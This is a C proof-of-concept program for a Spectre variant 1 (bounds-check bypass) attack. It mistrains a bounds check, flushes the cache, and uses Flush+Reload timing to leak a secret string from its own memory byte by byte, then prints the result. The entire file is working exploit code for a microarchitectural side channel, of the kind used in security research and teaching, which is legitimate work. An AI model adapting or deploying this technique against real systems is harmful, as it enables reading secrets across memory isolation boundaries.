#include <stdio.h>
#include <stdlib.h> 
#include <stdint.h>
#include <string.h>
#include <sys/mman.h>
#include "utils.h"

#define STRIDE 4096
#define RELOAD_BUF_SIZE STRIDE * 256
#define ITER 1024

#define NOPS(n) \
    asm volatile( \
        ".rept %0\n" \
        "nop\n" \
        ".endr\n" \
        :: "i" (n) \
    )


unsigned int size = 16;
uint8_t fake_buffer[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t *reloadbuffer;
char *secret = "_speculation_execute_";
unsigned int *index_p1 = &size;
unsigned char aligned_buffer1[4096];
unsigned int **index_p2 = &index_p1;
unsigned char aligned_buffer2[4096];
unsigned int ***index_p3 = &index_p2;
unsigned char aligned_buffer3[4096];
unsigned char data = 32;

volatile uint8_t pick = 0; 
uint64_t counter = 0;

void spectre_v1( size_t index) {
	//size = 16;
	//pick = data;
	if (index < size)
	{	
		NOPS(100);
		pick = reloadbuffer[fake_buffer[index] << 12];
	}
}

uint64_t measure_latency() {
	uint64_t time;
	uint64_t threshold;
	struct timespec start, end;
	for (int r = 0; r < 300; r++) {
		cacheflush(&fake_buffer[0]);
		time += timed_read(&fake_buffer[0], &start, &end);
	}
	threshold = time / 300;
	return threshold;
}


void leak(size_t target, uint8_t *byte) {
	int index, max = 0;
	size_t train_index, probe_addr;
	int results[256];
	int hit = 0;
	register uint64_t measured_clock;
	struct timespec start, end;
	int random_int;

	
	memset(results, 0 , sizeof(int) * 256);
	for (int tries = ITER; tries > 0; tries--) {
		for (int i = 0; i < 256; i++)
			cacheflush(&reloadbuffer[i * STRIDE]); 

		train_index = tries % size;
		for (int j = 128; j >= 0; j--) {
			random_int = random(5, 9);
			probe_addr = ((j % random_int) - 1) & 0xFFFFFFFFFFFFFF00; 
			probe_addr = (probe_addr | (probe_addr >> 8)); 
			probe_addr = train_index ^ (probe_addr & (target ^ train_index));
			cacheflush(&size);
		//	cacheflush(&data);
			size = 16;
			for(volatile int z = 0; z < 100; z++){
			}

			barrier();
			spectre_v1(probe_addr);
		}

		for (int i = 0; i < 256; i++)
		{
			index = ((i * 167) + 13) & 255;
			//index = i;
			measured_clock = timed_read(&reloadbuffer[index * STRIDE], &start, &end);
			if (measured_clock <= 160 && index != fake_buffer[tries % size] && index != fake_buffer[tries % size] + size)
				results[index]++; 
		}

		
		max = results[0];
		for(int m = 0; m < 256; m++){
			if(results[m] >= max){
				max = results[m];
				hit = m;
			}
		}


	}
	printf("cache hit: %c, %x\n", (uint8_t)hit, hit);
	*byte = (uint8_t)hit;
}

int main(int argc, const char * * argv) {
	reloadbuffer = (unsigned char *)mmap(0, RELOAD_BUF_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_HUGETLB, -1, 0);
	printf("Secret:  '%s'\n", secret);
	size_t offset = (size_t)(secret - (char *)fake_buffer);
	int secret_len = strlen(secret);
	uint8_t byte;
	memset(reloadbuffer, 1, sizeof(uint8_t) * RELOAD_BUF_SIZE);
	memset(aligned_buffer1, 1, sizeof(unsigned char) * 4096);
	memset(aligned_buffer2, 1, sizeof(unsigned char) * 4096);
	CACHE_THRESHOLD = measure_latency();

	uint8_t *leaked = (uint8_t *)malloc(sizeof(uint8_t) * secret_len);
	if (CACHE_THRESHOLD == 0) {
		fprintf(stderr, "Unreliable access timing\n");
		exit(EXIT_FAILURE);
	}

	for(int i = 0; i < secret_len; i++)
	{
		printf("ADDR: %p\t", (void *)offset + i);
		leak(offset + i, &byte);
		leaked[i] = byte;
	}

	printf("Leaked secret: \n");
	for(int i = 0; i < secret_len; i++){
		printf("%c", leaked[i]);
	}
	printf("\n");

	free(leaked);
	leaked = NULL;
	return 0;
}

